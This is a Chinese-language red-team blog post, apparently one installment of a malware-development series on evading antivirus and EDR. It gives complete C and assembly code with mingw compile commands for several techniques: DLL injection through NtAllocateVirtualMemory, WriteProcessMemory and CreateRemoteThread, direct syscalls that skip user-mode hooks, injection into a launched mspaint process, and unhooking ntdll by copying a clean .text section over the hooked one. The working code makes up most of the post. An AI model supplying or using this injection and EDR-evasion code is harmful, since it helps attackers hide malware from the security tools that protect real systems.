#  【MalDev-10】免杀-3   
原创 玄鹄安全  高级红队专家   2024-12-12 23:08  
  
   
### 05-高级免杀  
#### 01-syscalls  
  
应用层API通过调用syscalls执行内核操作，成功后将结果返回给应用层API，执行某些功能可以直接调用syscalls  
  
Syscall ID：每一个系统为每一个Syscall提供一个唯一的数字（Syscall ID或者系统服务号），比如使用x64dbg打开记事本，发现NtAllocateMemory的ID是18  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umfAwo27ichgO5dI99KVZnKQ93FcSiafTniaOoNm8vfpZfGQNVG1UlonUzAeVMITricjKdQMKPibVONolJg/640?wx_fmt=png&from=appmsg "")  
  
  
操作系统不同，Syscall ID也会不一样  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umfAwo27ichgO5dI99KVZnKQ9ibVFJgVVulHjHYicngA9CCUUQ1Lic7vibLt6F6IuvmXyg4OI1OpKdpS7kg/640?wx_fmt=png&from=appmsg "")  
  
  
使用syscalls进行dll注入，简单来说就是替换了应用层API调用  
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(  HANDLE             ProcessHandle,  PVOID              *BaseAddress,  ULONG              ZeroBits,  PULONG             RegionSize,  ULONG              AllocationType,  ULONG              Protect);

char maliciousLibraryPath[] = "C:\\temp\\evil.dll";
unsigned int maliciousLibraryPathLength = sizeof(maliciousLibraryPath) + 1;

int main(int argc, char* argv[]) {
  HANDLE targetProcess; // Target process handle
  HANDLE remoteThread;  // Remote thread
  LPVOID remoteBuffer;  // Remote buffer for data

  // Obtain handles to kernel32 and ntdll and retrieve function pointer
  HMODULE kernel32Handle = GetModuleHandle("Kernel32");
  HMODULE ntdllHandle = GetModuleHandle("ntdll");
  VOID *loadLibraryFunction = GetProcAddress(kernel32Handle, "LoadLibraryA");

  // Parse process ID
  if (atoi(argv[1]) == 0) {
    printf("Process ID not found. Exiting...\n");
    return -1;
  }
  printf("Process ID: %i", atoi(argv[1]));
  targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));

  pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdllHandle, "NtAllocateVirtualMemory");  

  // Allocate memory buffer in the remote process
  myNtAllocateVirtualMemory(targetProcess, &remoteBuffer, 0, (PULONG)&maliciousLibraryPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Copy the malicious DLL path to the remote process
  WriteProcessMemory(targetProcess, remoteBuffer, maliciousLibraryPath, maliciousLibraryPathLength, NULL);

  // Start a new thread in the target process
  remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryFunction, remoteBuffer, 0, NULL);
  CloseHandle(targetProcess);
  return 0;
}
```  
  
编译  
```
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```  
  
windows10上运行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umfAwo27ichgO5dI99KVZnKQ9rXKkggKrpcjqTTh0jhQ3iadyrNSXFLnIdNwSRnppexm6YDScpj2bia1g/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umfAwo27ichgO5dI99KVZnKQ9WFWyP898pbQA1GtvZ0XbYsy5laBUtIziaZqr7WMgeUibOC8rRn2PBqjQ/640?wx_fmt=png&from=appmsg "")  
  
#### 02-用户层hook  
  
通常安全软件做行为监测使用，获取软件执行中重要信息，也可以查看可执行权限的内存，比对特征码识别恶意软件等，hook安装在syscalls前的最后一步  
#### 03-直接调用syscalls  
  
直接调用可以避免应用层hook监测，需要使用汇编编译相关代码  
  
创建一个syscall.asm  
```
section .text
global myNtAllocateVirtualMemory
myNtAllocateVirtualMemory:
  mov r10, rcx
  mov eax, 18h ; syscall number for NtAllocateVirtualMemory
  syscall
  ret
```  
  
编译成.o格式  
```
nasm -f win64 -o syscall.o syscall.asm
```  
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

char maliciousLibraryPath[] = "C:\\temp\\evil.dll";
unsigned int maliciousLibraryPathLength = sizeof(maliciousLibraryPath) + 1;

extern "C" NTSTATUS myNtAllocateVirtualMemory(    HANDLE             ProcessHandle,    PVOID              *BaseAddress,    ULONG              ZeroBits,    PULONG             RegionSize,    ULONG              AllocationType,    ULONG              Protect);

int main(int argc, char* argv[]) {
  HANDLE targetProcess; // Handle to the target process
  HANDLE remoteThread;  // Remote thread
  LPVOID remoteBuffer;  // Remote buffer for data

  // Get the handle to Kernel32 and obtain function pointer
  HMODULE kernel32Handle = GetModuleHandle("Kernel32");
  VOID *loadLibraryFunction = (VOID*)GetProcAddress(kernel32Handle, "LoadLibraryA");

  // Parse the process ID
  if (atoi(argv[1]) == 0) {
    printf("Process ID not found. Exiting...\n");
    return -1;
  }
  printf("Process ID: %i", atoi(argv[1]));
  targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  myNtAllocateVirtualMemory(targetProcess, &remoteBuffer, 0, (PULONG)&maliciousLibraryPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Inject the malicious DLL into the target process
  WriteProcessMemory(targetProcess, remoteBuffer, maliciousLibraryPath, maliciousLibraryPathLength, NULL);

  // Start a new thread in the target process
  remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryFunction, remoteBuffer, 0, NULL);
  CloseHandle(targetProcess);
  return 0;
}
```  
  
C代码中使用extern "C"标记外部调用，调用汇编代码里的函数  
  
编译成.o格式  
```
x86_64-w64-mingw32-g++ -m64 -c hack2.c -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -Wall -shared -fpermissive
```  
  
把两个.o编译成exe  
```
x86_64-w64-mingw32-gcc *.o -o hack2.exe
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umfAwo27ichgO5dI99KVZnKQ9kFrkugvHzrAFg2xfFP6mVqeyo2ibCsmKO6cb4bjsiakNQ9fribpHyprtA/640?wx_fmt=png&from=appmsg "")  
  
  
下面一个例子是启动一个画图板在进行注入  
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(  HANDLE             ProcessHandle,  PVOID              *BaseAddress,  ULONG              ZeroBits,  PULONG             RegionSize,  ULONG              AllocationType,  ULONG              Protect);

char maliciousLibraryPath[] = "evil.dll";
unsigned int maliciousLibraryPathLength = sizeof(maliciousLibraryPath) + 1;

int findProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  HANDLE targetProcess; // Target process handle
  HANDLE remoteThread;  // Remote thread
  LPVOID remoteBuffer;  // Remote buffer for data

  // Obtain handles to kernel32 and ntdll and retrieve function pointer
  HMODULE kernel32Handle = GetModuleHandle("Kernel32");
  HMODULE ntdllHandle = GetModuleHandle("ntdll");
  VOID *loadLibraryFunction = (VOID *)GetProcAddress(kernel32Handle, "LoadLibraryA");

  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(STARTUPINFOA));
  si.cb = sizeof(STARTUPINFOA);
  const char* process = "mspaint.exe";
  CreateProcessA(NULL, (LPSTR)process,
  NULL, NULL, FALSE, 0, NULL, NULL, &si,&pi);
  int pid = -1;
  pid = findProc(process);

  // Parse process ID
  if (pid <= 0) {
    printf("Process ID not found. Exiting...\n");
    return -1;
  }

  printf("Process ID: %i", pid);
  targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

  pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdllHandle, "NtAllocateVirtualMemory");  

  // Allocate memory buffer in the remote process
  myNtAllocateVirtualMemory(targetProcess, &remoteBuffer, 0, (PULONG)&maliciousLibraryPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Copy the malicious DLL path to the remote process
  WriteProcessMemory(targetProcess, remoteBuffer, maliciousLibraryPath, maliciousLibraryPathLength, NULL);

  // Start a new thread in the target process
  remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryFunction, remoteBuffer, 0, NULL);
  CloseHandle(targetProcess);
  return 0;
}
```  
  
编译  
```
x86_64-w64-mingw32-g++ -O2 hack3.c -o hack3.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umfAwo27ichgO5dI99KVZnKQ95rSFQB44K8Mf6uoZeeomRmnHkjeAnRPCK9Bibodib5AWT4516PFEx7jw/640?wx_fmt=png&from=appmsg "")  
  
#### 04-bypass EDR  
  
有些EDR（McAfee EDR）通过篡改ntdll.dll实现注入，这样用户新的进程都会加载ntdll导致被注入进而hook，可以通过拷贝ntdll.dll的代码段，替换掉内存中被篡改的ntdll代码，恢复干净的ntdll  
```
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <psapi.h>

int main() {
  HANDLE hProcess = GetCurrentProcess();
  MODULEINFO moduleInfo = {};
  HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
  LPVOID lpStartingPageAddress = NULL;
  SIZE_T dwSizeOfTheRegion = NULL;

  // retrieve information about the loaded ntdll.dll module
  GetModuleInformation(hProcess, hNtdllModule, &moduleInfo, sizeof(moduleInfo));

  // get the base address of the ntdll.dll module
  LPVOID lpNtdllBase = (LPVOID)moduleInfo.lpBaseOfDll;

  // open the ntdll.dll file
  HANDLE hNtdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

  // create a file mapping for the ntdll.dll file
  HANDLE hNtdllMapping = CreateFileMapping(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);

  // map the file mapping into the process's virtual address space
  LPVOID lpNtdllMappingAddress = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);

  // get the DOS header of the hooked ntdll.dll
  PIMAGE_DOS_HEADER pDosHeaderOfHookedDll = (PIMAGE_DOS_HEADER)lpNtdllBase;

  // get the NT header of the hooked ntdll.dll
  PIMAGE_NT_HEADERS pNtHeaderOfHookedDll = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpNtdllBase + pDosHeaderOfHookedDll->e_lfanew);

  // loop through each section of the PE header
  for (WORD i = 0; i < pNtHeaderOfHookedDll->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER pHookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaderOfHookedDll) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

    // check if the section is the .text section
    if (!strcmp((char*)pHookedSectionHeader->Name, (char*)".text")) {
      DWORD dwOldProtection = 0;
      lpStartingPageAddress = (LPVOID)((DWORD_PTR)lpNtdllBase + (DWORD_PTR)pHookedSectionHeader->VirtualAddress);
      dwSizeOfTheRegion = pHookedSectionHeader->Misc.VirtualSize;

      // change the protection of the memory region to allow writing
      bool bIsProtected = VirtualProtect(lpStartingPageAddress, dwSizeOfTheRegion, PAGE_EXECUTE_READWRITE, &dwOldProtection);

      // copy the contents of the .text section from the clean ntdll.dll to the infected version
      memcpy(lpStartingPageAddress, (LPVOID)((DWORD_PTR)lpNtdllMappingAddress + (DWORD_PTR)pHookedSectionHeader->VirtualAddress), pHookedSectionHeader->Misc.VirtualSize);

      // restore the original protection of the memory region
      bIsProtected = VirtualProtect(lpStartingPageAddress, dwSizeOfTheRegion, dwOldProtection, &dwOldProtection);
    }
  }

  // cleanup
  CloseHandle(hProcess);
  CloseHandle(hNtdllFile);
  CloseHandle(hNtdllMapping);
  FreeLibrary(hNtdllModule);

  return 0;
}

```  
  
编译  
```
x86_64-w64-mingw32-g++ -O2 hack4.c -o hack4.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -w
```  
  
每个EDR使用的方法不一样，恢复内核ntdll的方式不一定适合所有EDR  
  
‍**配套实验环境和电子书加Q拉群下载**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VZNmh6ic5ume2jmTJQmbJibm5HL4ZuZJT0bnradFAnla3kFxr2XU1o9kFVTbos0go4zutJibuysORoZiafxzhgL8Zw/640?wx_fmt=jpeg "")  
  
